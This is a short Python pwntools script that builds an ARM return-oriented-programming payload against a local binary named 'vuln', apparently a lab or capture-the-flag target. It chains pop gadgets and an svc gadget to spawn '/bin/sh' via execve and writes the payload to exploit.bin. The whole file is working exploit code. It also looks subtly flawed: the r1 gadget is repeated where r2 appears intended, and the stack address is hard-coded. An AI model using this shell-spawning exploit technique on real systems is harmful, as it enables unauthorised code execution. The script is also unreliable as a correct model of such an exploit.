from pwn import *

context.update(arch='arm', os='linux', endian='little')

binary_path = "./vuln"
elf = ELF(binary_path)

def find_svc_gadget(elf):
    text_section = elf.get_section_by_name('.text')
    text_data = text_section.data()
    svc_bytes = b"\x00\x00\x00\xef"
    idx = text_data.find(svc_bytes)
    if idx == -1:
        print("[-] svc gadget not found in .text section")
        return None
    else:
        svc_addr = text_section.header.sh_addr + idx
        print(f"[+] found svc gadget at: {hex(svc_addr)}")
        return svc_addr

pop_r0_r4_pc = 0x00021b60
pop_r7_pc    = 0x00023914
pop_r1_pc    = 0x00063e64

svc_gadget = find_svc_gadget(elf)
if svc_gadget is None:
    svc_gadget = 0x00010500

binsh_addr = 0xfffee6f0 + 40

padding = b"A" * 36

payload = padding
payload += p32(pop_r0_r4_pc)
payload += p32(binsh_addr)
payload += p32(0x41414141)
payload += p32(pop_r7_pc)
payload += p32(11)
payload += p32(pop_r1_pc)
payload += p32(0)
payload += p32(pop_r1_pc)
payload += p32(0)
payload += p32(svc_gadget)
payload += b"/bin/sh\x00"

with open("exploit.bin", "wb") as f:
    f.write(payload)

print("[*] exploit payload written to exploit.bin, length:", len(payload))
